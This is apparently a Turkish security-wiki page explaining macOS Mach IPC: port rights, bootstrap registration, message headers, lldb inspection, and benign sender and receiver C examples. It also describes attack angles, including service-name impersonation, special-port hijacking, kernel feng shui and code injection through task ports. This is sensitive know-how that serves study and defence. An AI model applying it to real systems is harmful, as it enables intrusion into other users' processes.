# macOS IPC - İşlemler Arası İletişim

{{#include ../../../../banners/hacktricks-training.md}}

## Portlar üzerinden Mach messaging

### Temel Bilgiler

Mach, kaynakları paylaşmak için **task**'leri **en küçük birim** olarak kullanır ve her task **birden çok thread** içerebilir. Bu **task** ve **thread**'ler, **POSIX process** ve **thread**'lerine 1:1 olarak eşlenir.

Task'ler arasındaki iletişim, tek yönlü iletişim kanallarını kullanan Mach Inter-Process Communication (IPC) üzerinden gerçekleşir. **Mesajlar, kernel tarafından yönetilen bir tür **message queue** gibi çalışan portlar arasında aktarılır**.

Bir **port**, Mach IPC'nin **temel** öğesidir. **Mesaj göndermek ve almak** için kullanılabilir.

Her process'in bir **IPC table**'ı vardır; process'in **Mach port**'ları burada bulunabilir. Bir Mach port'un adı aslında bir sayıdır (kernel nesnesine işaret eden bir pointer).

Bir process ayrıca bazı haklarla birlikte bir port adını **farklı bir task'e** gönderebilir ve kernel, bu girdinin diğer task'in **IPC table**'ında görünmesini sağlar.

### Port Rights

Bir task'in gerçekleştirebileceği işlemleri tanımlayan port rights, bu iletişimin temel unsurudur. Olası **port rights** şunlardır ([tanımlar buradan alınmıştır](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[1]</sup>

- **Receive right**; port'a gönderilen mesajların alınmasını sağlar. Mach port'ları MPSC (multiple-producer, single-consumer) queue'larıdır; bu da tüm sistemde her **port** için yalnızca **tek bir receive right** bulunabileceği anlamına gelir (birden fazla process'in aynı pipe'ın okuma ucuna ait file descriptor'ları tutabildiği pipe'ların aksine).
- **Receive** right'a sahip bir **task**, mesajları alabilir ve mesaj göndermesine olanak sağlayan **Send rights** **oluşturabilir**. Başlangıçta yalnızca **kendi task'i**, kendi **port'u** üzerinde Receive right'a sahiptir.
- Receive right'ın sahibi **ölürse** veya onu sonlandırırsa, **send right kullanılamaz hale gelir (dead name).**
- **Send right**; port'a mesaj gönderilmesini sağlar.
- Send right **clone** edilebilir; böylece Send right'a sahip bir task bu right'ı clone edebilir ve **üçüncü bir task'e verebilir**.
- **Port rights**'ın Mach messages aracılığıyla **aktarılabileceğini** unutmayın.
- **Send-once right**; port'a bir mesaj gönderilmesini ve ardından ortadan kalkmasını sağlar.
- Bu right **clone** edilemez, ancak **taşınabilir**.
- **Port set right**, tek bir port yerine bir _port set_ belirtir. Bir port set'ten mesajın dequeued edilmesi, içerdiği portlardan birindeki mesajın dequeued edilmesi anlamına gelir. Port set'ler, Unix'teki `select`/`poll`/`epoll`/`kqueue` mekanizmalarına oldukça benzer şekilde, aynı anda birden fazla port'u dinlemek için kullanılabilir.
- **Dead name**, gerçek bir port right değildir; yalnızca bir placeholder'dır. Bir port yok edildiğinde, porta ait mevcut tüm port rights dead name'e dönüşür.

**Task'ler SEND rights'ı diğerlerine aktarabilir** ve böylece diğer task'lerin kendilerine mesaj göndermesini sağlayabilir. **SEND rights clone da edilebilir; böylece bir task right'ı çoğaltıp üçüncü bir task'e verebilir**. Bunun, **bootstrap server** olarak bilinen aracı bir process ile birlikte kullanılması, task'ler arasında etkili bir iletişim kurulmasını sağlar.

### File Ports

File ports, file descriptor'ları Mac port'ları içinde (Mach port rights kullanarak) kapsüllemeye olanak tanır. Belirli bir FD'den `fileport_makeport` kullanarak bir `fileport` oluşturmak ve bir fileport'tan `fileport_makefd` kullanarak bir FD oluşturmak mümkündür.

### İletişim kurma

Daha önce belirtildiği gibi Mach messages kullanılarak rights gönderilebilir; ancak bir Mach message göndermek için önceden message göndermeye yönelik bir right'a **sahip olmanız gerekir**. Peki ilk iletişim nasıl **kurulur**?

Bu işlemde **bootstrap server** (**macOS'ta** `launchd`) devreye girer. **Herkes bootstrap server'a bir SEND right alabileceği** için, başka bir process'e mesaj göndermek üzere bir right istenebilir:

1. Task **A**, **RECEIVE right** elde ederek **yeni bir port** oluşturur.
2. Task **A**, RECEIVE right'ın sahibi olarak **port için bir SEND right oluşturur**.
3. Task **A**, **bootstrap server** ile bir **bağlantı** kurar ve başlangıçta oluşturduğu portun **SEND right**'ını ona gönderir.
- Herkesin bootstrap server'a bir SEND right alabileceğini unutmayın.
4. Task A, verilen portu `com.apple.taska` gibi bir adla **ilişkilendirmek** için bootstrap server'a bir `bootstrap_register` mesajı gönderir.
5. Task **B**, service adı (`bootstrap_lookup`) için bir bootstrap **lookup** gerçekleştirmek üzere **bootstrap server** ile etkileşime girer. Bootstrap server'ın yanıt verebilmesi için Task B, lookup message içinde daha önce oluşturduğu bir portun **SEND right**'ını ona gönderir. Lookup başarılı olursa, **server** Task A'dan aldığı **SEND right**'ı çoğaltır ve **Task B'ye aktarır**.
- Herkesin bootstrap server'a bir SEND right alabileceğini unutmayın.
6. Task B, bu SEND right ile **Task A'ya** bir **mesaj gönderebilir**.
7. Çift yönlü iletişim için genellikle task **B**, bir **RECEIVE** right ve bir **SEND** right'a sahip yeni bir port oluşturur ve **SEND right**'ı **Task A'ya** verir; böylece Task A, TASK B'ye mesaj gönderebilir (çift yönlü iletişim).

Bootstrap server, bir task'in bildirdiği service adını **doğrulayamaz**. Bu, bir **task**'in authorization service adını yanlış biçimde **bildirip** her isteği onaylamak gibi, potansiyel olarak herhangi bir system task'i **taklit edebileceği** anlamına gelir.

Daha sonra Apple, system tarafından sağlanan service'lerin **adlarını**, **SIP-korumalı** dizinlerde bulunan güvenli configuration file'larında saklar: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her service adıyla birlikte, **ilgili binary** de saklanır. Bootstrap server, bu service adlarının her biri için bir **RECEIVE right** oluşturur ve bunu elinde tutar.

Bu önceden tanımlanmış service'ler için **lookup süreci** biraz farklıdır. Bir service adı lookup edildiğinde, launchd service'i dinamik olarak başlatır. Yeni workflow şu şekildedir:

- Task **B**, bir service adı için bootstrap **lookup** başlatır.
- **launchd**, task'in çalışıp çalışmadığını kontrol eder; çalışmıyorsa onu **başlatır**.
- Task **A** (service), bir **bootstrap check-in** (`bootstrap_check_in()`) gerçekleştirir. Burada **bootstrap** server bir SEND right oluşturur ve saklar, ardından **RECEIVE right'ı Task A'ya aktarır**.
- launchd, **SEND right'ı çoğaltır ve Task B'ye gönderir**.
- **Task B**, bir **RECEIVE** right ve bir **SEND** right'a sahip yeni bir port oluşturur ve **SEND right'ı Task A'ya** (svc) verir; böylece Task A, TASK B'ye mesaj gönderebilir (çift yönlü iletişim).

Ancak bu süreç yalnızca önceden tanımlanmış system task'leri için geçerlidir. System dışı task'ler hâlâ başlangıçta açıklanan şekilde çalışır; bu da potansiyel olarak impersonation'a olanak sağlayabilir.

> [!CAUTION]
> Bu nedenle launchd hiçbir zaman crash olmamalıdır; aksi halde tüm sistem crash olur.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[4]</sup>

Temel olarak bir system call olan `mach_msg` function'ı, Mach messages göndermek ve almak için kullanılır. Function, gönderilecek message'ın ilk argument olarak verilmesini gerektirir. Bu message, actual message içeriğinin ardından gelen bir `mach_msg_header_t` structure'ı ile başlamalıdır. Structure şu şekilde tanımlanır:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
_**receive right**_ sahibi süreçler, bir Mach port üzerindeki mesajları alabilir. Buna karşılık, **senders** süreçlerine bir _**send**_ veya _**send-once right**_ verilir. Send-once right yalnızca tek bir mesaj göndermek için kullanılır ve ardından geçersiz hale gelir.

İlk alan olan **`msgh_bits`** bir bitmap'tir:

- İlk bit (en anlamlı bit), bir mesajın complex olduğunu belirtmek için kullanılır (aşağıda daha fazla bilgi verilmiştir)
- 3. ve 4. bitler kernel tarafından kullanılır
- 2. byte'ın **en az anlamlı 5 biti**, **voucher** için kullanılabilir: key/value kombinasyonları göndermek için kullanılan başka bir port türü.
- 3. byte'ın **en az anlamlı 5 biti**, **local port** için kullanılabilir
- 4. byte'ın **en az anlamlı 5 biti**, **remote port** için kullanılabilir

Voucher, local ve remote port'larda belirtilebilen türler ([**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) şunlardır:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Örneğin, `MACH_MSG_TYPE_MAKE_SEND_ONCE`, bu port için bir **send-once** **right** türetilmesi ve aktarılması gerektiğini **belirtmek** için kullanılabilir. Alıcının yanıt verebilmesini engellemek için `MACH_PORT_NULL` da belirtilebilir.

Kolay bir **bi-directional communication** elde etmek için bir process, mach **message header** içinde _reply port_ (**`msgh_local_port`**) olarak adlandırılan bir **mach port** belirtebilir; böylece mesajın **receiver**'ı bu mesaja **send a reply** yapabilir.

> [!TIP]
> Bu tür bi-directional communication'ın yanıt bekleyen XPC mesajlarında (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`) kullanıldığını unutmayın. Ancak **genellikle bi-directional communication oluşturmak için**, daha önce açıklandığı gibi **farklı port'lar oluşturulur**.

Message header'ın diğer alanları şunlardır:

- `msgh_size`: tüm packet'ın boyutu.
- `msgh_remote_port`: bu message'ın gönderildiği port.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: receiver tarafından yorumlanan bu message'ın ID'si.

> [!CAUTION]
> **mach message**'ların, mach kernel içine yerleşik, **single receiver**, **multiple sender** communication channel olan bir `mach port` üzerinden gönderildiğini unutmayın. **Multiple process**, bir mach port'a **message** gönderebilir; ancak herhangi bir anda yalnızca **single process** bu port'tan okuma yapabilir.

Message'lar ardından **`mach_msg_header_t`** header'ı, sonrasında **body** ve **trailer** (varsa) ile oluşturulur ve yanıt verme izni sağlayabilir. Bu durumlarda kernel'in yalnızca message'ı bir task'tan diğerine aktarması gerekir.

Bir **trailer**, **kernel tarafından message'a eklenen information**'dır (user tarafından ayarlanamaz). Bu bilgi, message reception sırasında `MACH_RCV_TRAILER_<trailer_opt>` flag'leri ile istenebilir (istenebilecek farklı bilgiler vardır).

#### Complex Messages

Ancak ek port right'ları aktaran veya memory paylaşan message'lar gibi daha **complex** message'lar da vardır; bu message'larda kernel'in bu object'leri de recipient'a göndermesi gerekir. Bu durumlarda header'daki `msgh_bits` değerinin en anlamlı biti set edilir.

Aktarılabilecek descriptor'lar [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) içinde tanımlanmıştır:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
32bit'te tüm descriptor'lar 12B'dir ve descriptor türü 11. olandadır. 64bit'te boyutlar değişir.

> [!CAUTION]
> Kernel, descriptor'ları bir task'tan diğerine kopyalar, ancak önce **kernel memory içinde bir kopya oluşturur**. "Feng Shui" olarak bilinen bu teknik, çeşitli exploit'lerde kötüye kullanılarak bir process'in descriptor'ları kendisine göndermesi ve böylece **kernel'ın verileri kendi memory'sine kopyalaması** sağlanmıştır. Ardından process mesajları alabilir (kernel bunları free eder).
>
> Ayrıca **port rights'ları vulnerable bir process'e göndermek** de mümkündür; port rights'ları process'te (bunları handle etmese bile) doğrudan görünür.

### Mac Ports API'leri

Port'ların task namespace ile ilişkili olduğunu unutmayın; dolayısıyla bir port oluşturmak veya aramak için task namespace de sorgulanır (`mach/mach_port.h` içinde daha fazla bilgi vardır):

- **`mach_port_allocate` | `mach_port_construct`**: **Bir port oluşturur.**
- `mach_port_allocate` ayrıca bir **port set** de oluşturabilir: bir port grubuna ait receive right. Bir mesaj alındığında, mesajın hangi porttan geldiği belirtilir.
- `mach_port_allocate_name`: Port'un adını değiştirir (varsayılan olarak 32bit integer)
- `mach_port_names`: Bir target'tan port adlarını alır
- `mach_port_type`: Bir task'ın bir name üzerindeki rights'larını alır
- `mach_port_rename`: Bir port'u yeniden adlandırır (FD'ler için dup2 gibi)
- `mach_port_allocate`: Yeni bir RECEIVE, PORT_SET veya DEAD_NAME allocate eder
- `mach_port_insert_right`: RECEIVE hakkına sahip olduğunuz bir port'ta yeni bir right oluşturur
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach message'ları göndermek ve almak** için kullanılan function'lar. overwrite versiyonu, message reception için farklı bir buffer belirtmenizi sağlar (diğer versiyon buffer'ı yeniden kullanır).

### mach_msg Hata Ayıklama

**`mach_msg`** ve **`mach_msg_overwrite`** function'ları message göndermek ve almak için kullanıldığından, bunlara bir breakpoint koymak gönderilen ve alınan message'ları incelemeyi sağlar.

Örneğin debug edebileceğiniz herhangi bir application'ı debug etmeye başlayın; application, **bu function'ı kullanacak olan `libSystem.B`'yi yükler**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**'nin argument'larını almak için register'ları kontrol edin. Bunlar ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) içindeki argument'lardır:
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kayıt defterlerinden değerleri alın:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
İlk argümanı kontrol ederek mesaj başlığını inceleyin:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Bu tür `mach_msg_bits_t`, bir yanıt vermeye izin vermek için oldukça yaygındır.

### Portları listeleme
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name**, port için verilen varsayılan addır (ilk 3 byte'ta nasıl **arttığına** bakın). **`ipc-object`**, portun **obfuscate edilmiş** benzersiz **identifier**'ıdır.\
Yalnızca **`send`** hakkına sahip portların sahibini (port adı + pid) **belirlediğine** de dikkat edin.\
Ayrıca **aynı porta bağlı diğer task'leri** belirtmek için **`+`** işaretinin kullanıldığına dikkat edin.

Ayrıca, **registered service name**'leri de görmek için [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kullanmak mümkündür (`com.apple.system-task-port` gerektirdiği için SIP devre dışı bırakılmalıdır):
```
procesp 1 ports
```
Bu aracı iOS'a [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) adresinden indirerek yükleyebilirsiniz.

### Code example

**Gönderenin** bir portu nasıl **tahsis ettiğine**, `org.darlinghq.example` adı için bir **send right** oluşturduğuna ve bunu **bootstrap server**'a gönderdiğine; gönderenin ise bu adın **send right**'ını talep edip bir **message göndermek** için kullandığına dikkat edin.<sup>[1]</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

Bir task'in bu portlar üzerinde **SEND** izinlerine sahip olması durumunda **belirli hassas işlemleri gerçekleştirmeye veya belirli hassas verilere erişmeye** olanak tanıyan bazı özel portlar vardır. Bu durum, bu portları yalnızca yetenekleri nedeniyle değil, aynı zamanda **SEND izinlerini task'ler arasında paylaşmak mümkün olduğu** için de saldırganlar açısından oldukça ilgi çekici hâle getirir.

### Host Special Ports

Bu portlar bir numara ile temsil edilir.

**SEND** hakları **`host_get_special_port`** çağrılarak, **RECEIVE** hakları ise **`host_set_special_port`** çağrılarak elde edilebilir. Ancak her iki çağrı da yalnızca root'un erişebildiği **`host_priv`** portunu gerektirir. Ayrıca geçmişte root, **`host_set_special_port`** çağrısı yaparak keyfi portları ele geçirebiliyordu; bu da örneğin `HOST_KEXTD_PORT` portunu ele geçirerek code signature kontrollerini aşmaya olanak tanıyordu (SIP artık bunu engelliyor).

Bunlar 2 gruba ayrılır: **ilk 7 port kernel'e aittir**; bunlar 1 numaralı `HOST_PORT`, 2 numaralı `HOST_PRIV_PORT`, 3 numaralı `HOST_IO_MASTER_PORT` ve 7 numaralı `HOST_MAX_SPECIAL_KERNEL_PORT` portlarıdır.\
**8** numarasından **itibaren** başlayanlar **system daemon'larına aittir** ve [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) dosyasında tanımlanmış olarak bulunabilir.

- **Host port**: Bir process bu port üzerinde **SEND** yetkisine sahipse, aşağıdaki rutinleri çağırarak **system** hakkında **bilgi** alabilir:
- `host_processor_info`: Processor bilgilerini alır
- `host_info`: Host bilgilerini alır
- `host_virtual_physical_table_info`: Virtual/Physical page table (MACH_VMDEBUG gerektirir)
- `host_statistics`: Host istatistiklerini alır
- `mach_memory_info`: Kernel memory layout'unu alır
- **Host Priv port**: Bu port üzerinde **SEND** hakkına sahip bir process, boot verilerini görüntülemek veya bir kernel extension yüklemeyi denemek gibi **privileged işlemleri** gerçekleştirebilir. Bu izni alabilmek için **process'in root olması gerekir**.
- Ayrıca **`kext_request`** API'sini çağırmak için yalnızca Apple binary'lerine verilen **`com.apple.private.kext*`** entitlement'larına da sahip olmak gerekir.
- Çağrılabilecek diğer rutinler şunlardır:
- `host_get_boot_info`: `machine_boot_info()` bilgisini alır
- `host_priv_statistics`: Privileged istatistikleri alır
- `vm_allocate_cpm`: Contiguous Physical Memory ayırır
- `host_processors`: Host processor'larına SEND hakkı gönderir
- `mach_vm_wire`: Memory'yi resident hâle getirir
- Root bu izne erişebildiğinden, **host special veya exception port'larını ele geçirmek** için `host_set_[special/exception]_port[s]` çağrısını yapabilir.

Şu komut çalıştırılarak **tüm host special port'ları görüntülenebilir**:
```bash
procexp all ports | grep "HSP"
```
### Task Özel Portları

Bunlar, iyi bilinen servisler için ayrılmış portlardır. `task_[get/set]_special_port` çağrısı yapılarak alınmaları/ayarlanmaları mümkündür. `task_special_ports.h` dosyasında bulunabilirler:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[9]</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Bu task'i kontrol etmek için kullanılan port. Task'i etkileyen mesajları göndermek için kullanılır. **mach_task_self (see Task Ports below)** tarafından döndürülen port budur.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Task'in bootstrap port'u. Diğer system service port'larının döndürülmesini isteyen mesajları göndermek için kullanılır.
- **TASK_HOST_NAME_PORT**\[host-self send right]: İçerdiği host hakkında bilgi istemek için kullanılan port. **mach_host_self** tarafından döndürülen port budur.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Bu task'in wired kernel memory'sini aldığı kaynağı adlandıran port.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Bu task'in varsayılan memory managed memory'sini aldığı kaynağı adlandıran port.

### Task Ports

Başlangıçta Mach'ta "process" yoktu; bunun yerine thread'lerin bir container'ı olarak değerlendirilen "task" vardı. Mach BSD ile birleştirildiğinde **her task bir BSD process'iyle ilişkilendirildi**. Bu nedenle her BSD process'i process olmak için ihtiyaç duyduğu ayrıntılara, her Mach task'i de kendi iç işleyişine sahiptir (mevcut olmayan ve `kernel_task` olan pid 0 hariç).

Bununla ilişkili iki oldukça ilginç function vardır:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Belirtilen `pid` ile ilişkili task için bir SEND right alır ve bunu belirtilen `target_task_port`'a verir (bu genellikle `mach_task_self()` kullanmış olan caller task'tir, ancak farklı bir task üzerindeki bir SEND port'u da olabilir).
- `pid_for_task(task, &pid)`: Bir task'e ait SEND right verildiğinde, bu task'in hangi PID ile ilişkili olduğunu bulur.

Task içinde işlemler gerçekleştirmek için task'in `mach_task_self()` çağrısıyla kendisine ait bir `SEND` right'a ihtiyacı vardı (`task_self_trap` (28) kullanılır). Bu izinle bir task aşağıdakiler gibi çeşitli işlemler gerçekleştirebilir:

- `task_threads`: Task'in thread'lerine ait tüm task port'ları üzerinde SEND right alır
- `task_info`: Bir task hakkında bilgi alır
- `task_suspend/resume`: Bir task'i suspend veya resume eder
- `task_[get/set]_special_port`
- `thread_create`: Bir thread oluşturur
- `task_[get/set]_state`: Task state'ini kontrol eder
- ve daha fazlası [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) içinde bulunabilir

> [!CAUTION]
> Farklı bir **task**'in task port'u üzerinde bir SEND right bulunduğunda, bu işlemleri farklı bir task üzerinde gerçekleştirmek mümkündür.

Ayrıca task_port, bir task içindeki **memory'yi okumaya ve değiştirmeye** `vm_read()` ve `vm_write()` gibi function'larla izin veren **`vm_map`** port'udur. Bu, farklı bir task'in task_port'u üzerinde SEND right bulunan bir task'in, o task'e **code inject** edebileceği anlamına gelir.

